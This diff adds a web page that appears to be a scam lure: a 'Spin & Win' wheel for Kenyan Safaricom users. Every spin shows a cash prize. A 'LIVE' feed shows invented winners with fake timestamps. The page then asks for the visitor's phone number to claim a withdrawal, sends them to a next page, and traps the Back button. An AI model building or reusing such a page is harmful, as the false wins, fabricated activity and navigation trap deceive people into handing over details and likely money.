@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Pesa Chapaa — Spin & Win</title>
+<meta name="theme-color" content="#050708">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700;800&family=Manrope:wght@700;800&display=swap" rel="stylesheet">
+<style>
+:root{--black:#050708;--black-2:#091014;--navy:#0b151b;--gold:#d8a84e;--gold-light:#f5d58b;--gold-bright:#ffd978;--gold-dark:#a87524;--green:#00c98b;--green-dark:#008c65;--white:#fff;--muted:#8b999d;--border:rgba(255,255,255,.09)}
+*{box-sizing:border-box;margin:0;padding:0}html{scroll-behavior:smooth}body{min-height:100vh;display:flex;justify-content:center;padding:20px 14px 45px;font-family:"DM Sans",sans-serif;color:var(--white);background:radial-gradient(circle at 50% -10%,rgba(216,168,78,.20),transparent 35%),radial-gradient(circle at 0% 55%,rgba(0,201,139,.08),transparent 30%),var(--black)}body::before{content:"";position:fixed;inset:0;pointer-events:none;background:linear-gradient(120deg,transparent,rgba(255,255,255,.015),transparent)}.container{width:min(100%,480px);text-align:center;position:relative}.brand{margin-bottom:20px}.brand-name{font-family:"Manrope",sans-serif;font-size:15px;font-weight:800;letter-spacing:3px;background:linear-gradient(120deg,#b9822d,#ffe39b,#c58e37,#ffe8a7);-webkit-background-clip:text;background-clip:text;color:transparent}.secure-badge{display:inline-flex;align-items:center;gap:6px;margin-top:9px;padding:6px 10px;border:1px solid rgba(0,201,139,.18);border-radius:999px;background:rgba(0,201,139,.06);color:#55dcb8;font-size:8px;font-weight:800;letter-spacing:1px}.secure-dot{width:6px;height:6px;border-radius:50%;background:var(--green);box-shadow:0 0 10px rgba(0,201,139,.8)}h1{font-family:"Manrope",sans-serif;font-size:clamp(34px,10vw,54px);line-height:1;letter-spacing:-2.5px;margin-top:15px}h1 span{color:var(--gold-bright);text-shadow:0 0 35px rgba(255,217,120,.18)}.caption{max-width:400px;margin:15px auto 0;color:var(--muted);font-size:13px;line-height:1.65}.caption strong{color:#dce5e3}.jackpot-card{position:relative;margin:25px auto;padding:17px;width:min(100%,350px);border-radius:20px;border:1px solid rgba(216,168,78,.25);background:linear-gradient(145deg,rgba(255,255,255,.075),rgba(255,255,255,.025));box-shadow:inset 0 1px 0 rgba(255,255,255,.08),0 20px 50px rgba(0,0,0,.28);overflow:hidden}.jackpot-card::before{content:"";position:absolute;width:180px;height:180px;left:50%;top:50%;transform:translate(-50%,-50%);background:rgba(216,168,78,.11);filter:blur(45px);border-radius:50%}.jackpot-label{position:relative;color:#8e999d;font-size:8px;font-weight:800;letter-spacing:3px}.jackpot-value{position:relative;margin-top:2px;font-family:"Manrope",sans-serif;font-size:clamp(39px,11vw,58px);line-height:1;font-weight:800;letter-spacing:-3px;background:linear-gradient(120deg,#b47b25,#ffe9a6,#d19a3c,#fff0bd,#b67e28);-webkit-background-clip:text;background-clip:text;color:transparent;text-shadow:0 5px 25px rgba(216,168,78,.16)}.jackpot-caption{position:relative;margin-top:7px;color:#697579;font-size:8px;font-weight:700;letter-spacing:1.5px}.wheel-container{position:relative;width:min(86vw,350px);aspect-ratio:1;margin:25px auto 0}.wheel-ring{position:absolute;inset:-9px;border-radius:50%;background:conic-gradient(#8c5e1e,#f6d27d,#b87d27,#fff0ae,#a96f20,#f0ca6c,#8c5e1e);box-shadow:0 0 0 2px rgba(255,255,255,.08),0 20px 50px rgba(0,0,0,.5),0 0 35px rgba(216,168,78,.14)}.wheel{position:absolute;inset:0;width:100%;height:100%;border-radius:50%;overflow:hidden;border:5px solid #161a1b;background:conic-gradient(#075f49 0deg 30deg,#9b7027 30deg 60deg,#075f49 60deg 90deg,#9b7027 90deg 120deg,#075f49 120deg 150deg,#9b7027 150deg 180deg,#075f49 180deg 210deg,#9b7027 210deg 240deg,#075f49 240deg 270deg,#9b7027 270deg 300deg,#075f49 300deg 330deg,#9b7027 330deg 360deg);box-shadow:inset 0 0 30px rgba(0,0,0,.45);transition:transform 5.5s cubic-bezier(.12,.72,.15,1)}.wheel::after{content:"";position:absolute;inset:0;border-radius:50%;background:repeating-conic-gradient(from 0deg,rgba(255,255,255,.24) 0deg 1deg,transparent 1deg 30deg);pointer-events:none}.amount{position:absolute;inset:0;display:flex;justify-content:center;align-items:flex-start;padding-top:18px;color:#fff;font-family:"Manrope",sans-serif;font-size:clamp(9px,2.5vw,12px);font-weight:800;text-shadow:0 2px 5px rgba(0,0,0,.75);z-index:3}.a1{transform:rotate(15deg)}.a2{transform:rotate(45deg)}.a3{transform:rotate(75deg)}.a4{transform:rotate(105deg)}.a5{transform:rotate(135deg)}.a6{transform:rotate(165deg)}.a7{transform:rotate(195deg)}.a8{transform:rotate(225deg)}.a9{transform:rotate(255deg)}.a10{transform:rotate(285deg)}.a11{transform:rotate(315deg)}.a12{transform:rotate(345deg)}.center-hub{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:76px;height:76px;border-radius:50%;z-index:10;display:flex;flex-direction:column;justify-content:center;align-items:center;border:4px solid #d7ad59;background:radial-gradient(circle at 35% 30%,#253139,#070b0d 65%);box-shadow:0 0 0 5px rgba(216,168,78,.12),0 8px 25px rgba(0,0,0,.5)}.center-hub strong{color:var(--gold-bright);font-family:"Manrope",sans-serif;font-size:13px;letter-spacing:1px}.center-hub span{margin-top:2px;color:#839094;font-size:7px;font-weight:800;letter-spacing:1px}.pointer{position:absolute;top:-20px;left:50%;transform:translateX(-50%);z-index:25;width:0;height:0;border-left:18px solid transparent;border-right:18px solid transparent;border-top:38px solid #f0c866;filter:drop-shadow(0 4px 5px rgba(0,0,0,.6))}.pointer::before{content:"";position:absolute;left:-8px;top:-34px;width:16px;height:16px;border-radius:50%;background:#fff1bd;box-shadow:0 0 15px rgba(255,220,130,.7)}.spin-btn{position:relative;width:min(100%,350px);min-height:64px;margin-top:38px;border:1px solid rgba(255,255,255,.25);border-radius:17px;cursor:pointer;background:linear-gradient(135deg,#f1cf7b,#c08b31);color:#081014;font-family:"Manrope",sans-serif;font-size:15px;font-weight:800;letter-spacing:1.2px;box-shadow:0 0 0 1px rgba(216,168,78,.15),0 16px 40px rgba(216,168,78,.20);transition:transform .2s ease,box-shadow .2s ease,opacity .2s ease}.spin-btn:hover:not(:disabled){transform:translateY(-3px);box-shadow:0 0 0 1px rgba(216,168,78,.25),0 20px 50px rgba(216,168,78,.32)}.spin-btn:active:not(:disabled){transform:translateY(0)}.spin-btn:disabled{cursor:not-allowed;opacity:.55}.spin-icon{margin-right:8px;font-size:19px}.trust{margin-top:12px;color:#566367;font-size:8px;font-weight:700;letter-spacing:.7px}.popup{position:fixed;inset:0;display:none;justify-content:center;align-items:center;padding:20px;background:rgba(0,0,0,.78);backdrop-filter:blur(8px);z-index:100}.popup-box{width:min(100%,370px);padding:34px 23px 27px;border-radius:24px;border:1px solid rgba(216,168,78,.30);background:radial-gradient(circle at 50% 0%,rgba(216,168,78,.13),transparent 45%),#0b1216;box-shadow:0 30px 80px rgba(0,0,0,.6);text-align:center;animation:popupIn .35s ease}@keyframes popupIn{from{opacity:0;transform:scale(.92) translateY(15px)}to{opacity:1;transform:scale(1) translateY(0)}}.win-icon{width:68px;height:68px;margin:0 auto 16px;display:grid;place-items:center;border-radius:50%;background:linear-gradient(135deg,#f4d17e,#bd852d);color:#111;font-size:29px;box-shadow:0 0 0 8px rgba(216,168,78,.08),0 12px 30px rgba(216,168,78,.20)}.popup-box h2{font-family:"Manrope",sans-serif;font-size:23px;color:#f5d58b;margin-bottom:10px}.popup-box p{color:#aab5b6;font-size:13px;line-height:1.6;margin-bottom:20px}#winText strong{display:block;margin-top:7px;font-family:"Manrope",sans-serif;font-size:30px;color:var(--gold-bright)}.continue-btn{width:100%;min-height:56px;border:0;border-radius:14px;background:linear-gradient(135deg,#00d394,#008f68);color:#fff;font-family:"Manrope",sans-serif;font-size:13px;font-weight:800;letter-spacing:1px;cursor:pointer;box-shadow:0 12px 30px rgba(0,201,139,.18)}footer{margin-top:30px;color:#465256;font-size:8px;line-height:1.6}footer strong{color:#697578}
+/* RESULT SECTION */
+#resultSection{display:none;text-align:center}.result-card{position:relative;overflow:hidden;padding:30px 20px 24px;border:1px solid rgba(216,168,78,.22);border-radius:28px;background:linear-gradient(145deg,rgba(255,255,255,.075),rgba(255,255,255,.025));box-shadow:inset 0 1px 0 rgba(255,255,255,.08),0 30px 80px rgba(0,0,0,.45)}.result-card::before{content:"";position:absolute;width:220px;height:220px;left:50%;top:-90px;transform:translateX(-50%);border-radius:50%;background:rgba(216,168,78,.13);filter:blur(55px)}.winner-badge{position:relative;display:inline-flex;align-items:center;gap:7px;padding:7px 12px;border:1px solid rgba(0,184,135,.22);border-radius:999px;background:rgba(0,184,135,.08);color:#52d8b5;font-size:9px;font-weight:800;letter-spacing:1.5px}.winner-dot{width:6px;height:6px;border-radius:50%;background:#00b887;box-shadow:0 0 10px #00b887}.result-card h2{position:relative;margin-top:20px;font-family:"Manrope",sans-serif;font-size:clamp(31px,9vw,43px);line-height:1.05;font-weight:800;letter-spacing:-1.5px}.subtitle{position:relative;margin-top:10px;color:#89969a;font-size:13px;line-height:1.6}.reward-box{position:relative;margin:25px 0 23px;padding:22px 15px;border-radius:22px;border:1px solid rgba(216,168,78,.28);background:linear-gradient(145deg,rgba(216,168,78,.12),rgba(255,255,255,.025));box-shadow:inset 0 1px 0 rgba(255,255,255,.06)}.reward-label{color:#879397;font-size:9px;font-weight:800;letter-spacing:3px}.reward{margin-top:4px;font-family:"Manrope",sans-serif;font-size:clamp(48px,14vw,70px);line-height:1;font-weight:800;letter-spacing:-4px;color:var(--gold-bright);text-shadow:0 5px 25px rgba(216,168,78,.22)}.reward-caption{margin-top:11px;color:#788589;font-size:9px}.form-title{margin-bottom:8px;color:#dce5e4;font-size:13px;font-weight:700}.form-description{margin-bottom:13px;color:#778487;font-size:10px;line-height:1.5}.phone-input{width:100%;padding:17px 16px;border:1px solid rgba(255,255,255,.10);border-radius:15px;outline:none;background:rgba(0,0,0,.28);color:#fff;font-family:"DM Sans",sans-serif;font-size:15px}.phone-input::placeholder{color:#667477}.phone-input:focus{border-color:rgba(216,168,78,.55);box-shadow:0 0 0 3px rgba(216,168,78,.08)}.withdraw-btn{width:100%;min-height:60px;margin-top:12px;border:1px solid rgba(255,255,255,.22);border-radius:16px;background:linear-gradient(135deg,#f0ca72,#c9973e);color:#081014;font-family:"Manrope",sans-serif;font-size:13px;font-weight:800;letter-spacing:.8px;cursor:pointer;box-shadow:0 15px 40px rgba(216,168,78,.18)}.security-note{display:flex;justify-content:center;align-items:center;gap:6px;margin-top:11px;color:#5f6b6e;font-size:8px}.security-icon{color:#52d8b5}.recent-activities{width:min(100%,520px);margin:25px auto;padding:18px;border-radius:22px;background:linear-gradient(145deg,rgba(255,255,255,.07),rgba(255,255,255,.025));border:1px solid rgba(255,210,90,.18);box-shadow:0 20px 60px rgba(0,0,0,.35),inset 0 1px rgba(255,255,255,.08);overflow:hidden}.activities-header{display:flex;align-items:center;gap:8px;margin-bottom:14px;color:#f4d477;font-size:11px;font-weight:900;letter-spacing:1.8px}.live-dot{width:7px;height:7px;border-radius:50%;background:#35e68a;box-shadow:0 0 8px rgba(53,230,138,.9);animation:livePulse 1.3s infinite}@keyframes livePulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.35;transform:scale(.65)}}.live-label{margin-left:auto;padding:4px 8px;border-radius:20px;background:rgba(53,230,138,.10);border:1px solid rgba(53,230,138,.25);color:#52ed9b;font-size:8px;letter-spacing:1px}.activity-window{position:relative;height:245px;overflow:hidden}.activity-window::before,.activity-window::after{content:"";position:absolute;left:0;width:100%;height:35px;z-index:5;pointer-events:none}.activity-window::before{top:0;background:linear-gradient(to bottom,rgba(17,22,22,1),transparent)}.activity-window::after{bottom:0;background:linear-gradient(to top,rgba(17,22,22,1),transparent)}.activity-list{display:flex;flex-direction:column;gap:9px;animation:activityScroll 16s linear infinite}@keyframes activityScroll{0%{transform:translateY(0)}100%{transform:translateY(-50%)}}.activity{display:flex;align-items:center;gap:10px;min-height:58px;padding:10px 12px;border-radius:15px;background:rgba(255,255,255,.035);border:1px solid rgba(255,255,255,.045)}.activity-icon{display:flex;align-items:center;justify-content:center;width:30px;height:30px;flex-shrink:0;border-radius:50%;background:rgba(53,230,138,.10);border:1px solid rgba(53,230,138,.25);color:#4de996;font-size:13px;font-weight:900}.activity div{flex:1;min-width:0}.activity strong{display:block;color:#fff;font-size:12px;font-weight:800}.activity span{display:block;margin-top:2px;color:#aeb8b6;font-size:10px}.activity small{flex-shrink:0;color:#788380;font-size:9px}.result-footer{padding-top:32px;text-align:center}.footer-logo{color:#f3d28a;font-family:"Manrope",sans-serif;font-size:13px;font-weight:800;letter-spacing:.5px}.result-footer p{margin-top:6px;color:#465255;font-size:8px}
+@media(max-width:480px){body{padding-top:16px}h1{font-size:38px}.caption{font-size:12px}.jackpot-card{margin-top:21px}.wheel-container{width:min(84vw,335px)}.spin-btn{margin-top:32px}.center-hub{width:68px;height:68px}.center-hub strong{font-size:11px}.result-card{padding:27px 17px 21px;border-radius:24px}.reward{font-size:57px}.activity{padding:15px}}
+</style>
+</head>
+<body>
+<div class="container" id="wheelSection">
+    <div class="brand"><div class="brand-name">PESACHAPAA</div><div class="secure-badge"><span class="secure-dot"></span>PROMOTION ACTIVE</div></div>
+    <h1>Spin &amp; <span>Win</span></h1>
+    <p class="caption">Spin the wheel for your chance to win genuine cash rewards of up to <strong>KSh 50,000</strong>.</p>
+    <div class="jackpot-card"><div class="jackpot-label">MAXIMUM REWARD</div><div class="jackpot-value">KSh 50,000</div><div class="jackpot-caption">THE TOP PRIZE IS RARE</div></div>
+    <div class="wheel-container">
+        <div class="wheel-ring"></div><div class="pointer"></div>
+        <div class="wheel" id="wheel">
+            <div class="amount a1">KSh 500</div><div class="amount a2">KSh 750</div><div class="amount a3">KSh 1,000</div><div class="amount a4">KSh 1,500</div><div class="amount a5">KSh 2,000</div><div class="amount a6">KSh 1,000</div><div class="amount a7">KSh 2,500</div><div class="amount a8">KSh 3,000</div><div class="amount a9">KSh 5,000</div><div class="amount a10">KSh 10,000</div><div class="amount a11">KSh 25,000</div><div class="amount a12">KSh 50,000</div>
+        </div>
+        <div class="center-hub"><strong>SPIN</strong><span>GOOD LUCK</span></div>
+    </div>
+    <button class="spin-btn" id="spinBtn" type="button"><span class="spin-icon">✦</span>SPIN NOW</button>
+    <div class="trust">ONE SPIN PER PROMOTION ENTRY</div>
+    <div class="popup" id="popup" role="dialog" aria-modal="true">
+        <div class="popup-box"><div class="win-icon">✓</div><h2>Congratulations!</h2><p id="winText"></p><button class="continue-btn" type="button" onclick="showResult()">CONTINUE</button></div>
+    </div>
+    <footer><strong>Pesa Chapaa Promotion</strong><br>Prize availability and eligibility are subject to the official promotion terms.</footer>
+</div>
+
+<!-- RESULT IS NOW ON THE SAME PAGE -->
+<div class="container" id="resultSection">
+    <div class="brand"><div class="brand-name">PESACHAPAA</div></div>
+    <div class="result-card">
+        <div class="winner-badge"><span class="winner-dot"></span>SPIN COMPLETED</div>
+        <h2>Congratulations!</h2>
+        <p class="subtitle">Your spin has been completed successfully. Your displayed reward is shown below.</p>
+        <div class="reward-box"><div class="reward-label">YOUR REWARD</div><div class="reward" id="winningAmount">Loading...</div><div class="reward-caption">Reward generated by your completed spin</div></div>
+        <div class="form-title">Continue to the next step</div>
+        <div class="form-description">Enter your Safaricom number to continue.</div>
+        <input id="phone" class="phone-input" type="tel" inputmode="numeric" autocomplete="tel" maxlength="10" placeholder="07XXXXXXXX">
+        <button class="withdraw-btn" onclick="requestWithdrawal()">CONTINUE <span>→</span></button>
+        <div class="security-note"><span class="security-icon">●</span>Secure form • Your number is used for the next step</div>
+    </div>
+    <div class="recent-activities">
+        <div class="activities-header"><span class="live-dot"></span>RECENT ACTIVITIES<span class="live-label">LIVE</span></div>
+        <div class="activity-window"><div class="activity-list" id="activityList">
+            <div class="activity"><span class="activity-icon">✓</span><div><strong>Sarah M.</strong><span>won KSh 5,000</span></div><small>just now</small></div>
+            <div class="activity"><span class="activity-icon">✓</span><div><strong>Brian K.</strong><span>completed the promotion</span></div><small>12 sec ago</small></div>
+            <div class="activity"><span class="activity-icon">✓</span><div><strong>Mary W.</strong><span>won KSh 10,000</span></div><small>24 sec ago</small></div>
+            <div class="activity"><span class="activity-icon">✓</span><div><strong>Kevin O.</strong><span>completed the promotion</span></div><small>38 sec ago</small></div>
+            <div class="activity"><span class="activity-icon">✓</span><div><strong>Jane N.</strong><span>won KSh 2,500</span></div><small>51 sec ago</small></div>
+            <div class="activity"><span class="activity-icon">✓</span><div><strong>David A.</strong><span>completed the promotion</span></div><small>1 min ago</small></div>
+        </div></div>
+    </div>
+    <footer class="result-footer"><div class="footer-logo">PesaChapaa</div><p>© 2026 PesaChapaa. All rights reserved.</p></footer>
+</div>
+
+<script>
+/* =========================================================
+   SINGLE-PAGE VERSION
+   Same prize logic and spin logic.
+   Only the results page navigation has been removed.
+========================================================= */
+
+const STORAGE_KEY = "winningAmount";
+const PLAYED_KEY = "wheelPlayed";
+
+const wheel = document.getElementById("wheel");
+const spinBtn = document.getElementById("spinBtn");
+const popup = document.getElementById("popup");
+const winText = document.getElementById("winText");
+const wheelSection = document.getElementById("wheelSection");
+const resultSection = document.getElementById("resultSection");
+
+const prizes = [
+    "KSh 500", "KSh 750", "KSh 1,000", "KSh 1,500",
+    "KSh 2,000", "KSh 1,000", "KSh 2,500", "KSh 3,000",
+    "KSh 5,000", "KSh 10,000", "KSh 25,000", "KSh 50,000"
+];
+
+let currentRotation = 0;
+let spinning = false;
+
+function choosePrize() {
+    const random = Math.random();
+    if (random < 0.005) return "KSh 50,000";
+    if (random < 0.015) return "KSh 25,000";
+    if (random < 0.035) return "KSh 10,000";
+    if (random < 0.085) return "KSh 5,000";
+    if (random < 0.165) return "KSh 3,000";
+    if (random < 0.255) return "KSh 2,500";
+    if (random < 0.375) return "KSh 2,000";
+    if (random < 0.515) return "KSh 1,500";
+    if (random < 0.765) return "KSh 1,000";
+    if (random < 0.900) return "KSh 750";
+    return "KSh 500";
+}
+
+function getPrizeIndex(prize) {
+    const indexMap = {
+        "KSh 500": 0,
+        "KSh 750": 1,
+        "KSh 1,000": 2,
+        "KSh 1,500": 3,
+        "KSh 2,000": 4,
+        "KSh 2,500": 6,
+        "KSh 3,000": 7,
+        "KSh 5,000": 8,
+        "KSh 10,000": 9,
+        "KSh 25,000": 10,
+        "KSh 50,000": 11
+    };
+    return indexMap[prize] ?? 0;
+}
+
+spinBtn.addEventListener("click", function () {
+    if (spinning) return;
+
+    spinning = true;
+    spinBtn.disabled = true;
+    spinBtn.textContent = "SPINNING...";
+    spinBtn.style.opacity = "0.6";
+    popup.style.display = "none";
+
+    const winningPrize = choosePrize();
+    const prizeIndex = getPrizeIndex(winningPrize);
+
+    console.log("Selected winning prize:", winningPrize);
+    console.log("Selected wheel section:", prizeIndex);
+
+    const sectionAngle = 30;
+    const targetAngle = 360 - (prizeIndex * sectionAngle) - (sectionAngle / 2);
+    const extraSpins = 6;
+
+    currentRotation += (extraSpins * 360) + targetAngle;
+
+    wheel.style.transition = "transform 5.5s cubic-bezier(.12,.72,.15,1)";
+    wheel.style.transform = `rotate(${currentRotation}deg)`;
+
+    setTimeout(function () {
+        console.log("Wheel has finished spinning.");
+
+        /* EXACT SAME STORAGE LOGIC, with a single key */
+        localStorage.setItem(STORAGE_KEY, winningPrize);
+        localStorage.setItem(PLAYED_KEY, "true");
+
+        const savedPrize = localStorage.getItem(STORAGE_KEY);
+
+        console.log("WINNING PRIZE:", winningPrize);
+        console.log("SAVED TO LOCALSTORAGE:", savedPrize);
+
+        if (!savedPrize) {
+            console.error("Winning prize was not saved.");
+            alert("Winning result could not be saved. Please try again.");
+            spinning = false;
+            spinBtn.disabled = false;
+            spinBtn.textContent = "SPIN NOW";
+            spinBtn.style.opacity = "1";
+            return;
+        }
+
+        winText.innerHTML = `Congratulations!<strong>${savedPrize}</strong>`;
+        popup.style.display = "flex";
+
+        spinning = false;
+        spinBtn.style.opacity = "1";
+        spinBtn.disabled = true;
+        spinBtn.textContent = "COMPLETED";
+    }, 5500);
+});
+
+function showResult() {
+    const savedPrize = localStorage.getItem(STORAGE_KEY);
+
+    console.log("Result before display:", savedPrize);
+
+    if (!savedPrize) {
+        alert("Winning result was not saved. Please spin again.");
+        return;
+    }
+
+    document.getElementById("winningAmount").textContent = savedPrize;
+
+    popup.style.display = "none";
+    wheelSection.style.display = "none";
+    resultSection.style.display = "block";
+
+    window.scrollTo({ top: 0, behavior: "smooth" });
+}
+
+function requestWithdrawal() {
+    const phone = document.getElementById("phone").value.trim();
+
+    if (phone === "") {
+        alert("Please enter your Safaricom number.");
+        return;
+    }
+
+    if (!/^07\d{8}$/.test(phone)) {
+        alert("Please enter a valid 10-digit number beginning with 07.");
+        return;
+    }
+
+    /* Keep your existing next-step flow. */
+    window.location.replace("next.html");
+}
+
+document.getElementById("phone").addEventListener("keydown", function(event) {
+    if (event.key === "Enter") {
+        requestWithdrawal();
+    }
+});
+
+/* Prevent back to wheel after reaching result */
+history.pushState(null, "", location.href);
+window.addEventListener("popstate", function() {
+    history.pushState(null, "", location.href);
+});
+</script>
+</body>
+</html>
